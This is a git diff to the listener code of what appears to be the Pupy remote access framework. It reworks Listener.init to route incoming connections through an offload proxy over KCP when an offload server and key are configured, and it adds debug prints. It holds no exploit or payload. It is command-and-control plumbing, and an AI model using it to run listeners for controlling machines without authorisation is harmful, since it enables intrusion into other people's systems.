@@ -27,6 +27,8 @@ from .PupyService import PupyBindService
 from .PupyCompile import pupycompile
 from network.conf import transports
 from network.lib.connection import PupyConnectionThread
+from network.lib.servers import PupyTCPServer
+from network.lib.streams.PupySocketStream import PupySocketStream
 from pupylib.utils.rpyc_utils import obtain
 from pupylib.utils.network import get_listener_ip_with_local
 from pupylib.PupyDnsCnc import PupyDnsCnc
@@ -195,31 +197,57 @@ class Listener(Thread):
             logging.exception(e)
 
     def init(self):
-        self.server = self.transport.server(
+        proxy = None
+        method = None
+
+        stream = self.transport.stream
+        transport = self.transport.server_transport
+        server = self.transport.server
+        transport_kwargs = self.transport.server_transport_kwargs
+        ipv6 = self.ipv6
+        igd = self.igd
+        external = self.external
+        external_port = self.external_port
+        authenticator = self.authenticator
+
+        if self.pupsrv:
+            offload_server = self.pupsrv.config.get('pupyd', 'offload_server')
+            offload_psk = self.pupsrv.config.get('pupyd', 'offload_psk')
+
+            if offload_server and offload_psk:
+                proxy = PupyOffloadManager(offload_server, offload_psk)
+
+                print "ORIGINAL STREAM: ", stream, type(stream)
+
+                stream = PupySocketStream
+                server = PupyTCPServer
+
+                ipv6 = False
+                igd = None
+
+                method = proxy.kcp
+                print "METHOD: ", method
+
+        self.server = server(
             PupyService,
             port=self.port, hostname=self.address,
-            authenticator=self.authenticator,
-            stream=self.transport.stream,
-            transport=self.transport.server_transport,
-            transport_kwargs=self.transport.server_transport_kwargs,
+            authenticator=authenticator,
+            stream=stream,
+            transport=transport,
+            transport_kwargs=transport_kwargs,
             pupy_srv=self.pupsrv,
-            ipv6=self.ipv6,
-            igd=self.igd,
-            external=self.external,
-            external_port=self.external_port
+            ipv6=ipv6,
+            igd=igd,
+            external=external,
+            external_port=external_port
         )
 
-        if not self.pupsrv:
-            return
-
-        offload_server = self.pupsrv.config.get('pupyd', 'offload_server')
-        offload_psk = self.pupsrv.config.get('pupyd', 'offload_psk')
-        if not (offload_server and offload_psk):
+        if not ( proxy and method ):
             return
 
         ## Workaround..
         self.server.listener.close()
-        self.server.listener = PupyOffloadManager(offload_server, offload_psk).tcp(self.port)
+        self.server.listener = method(self.port)
 
     def run(self):
         self.server.start()
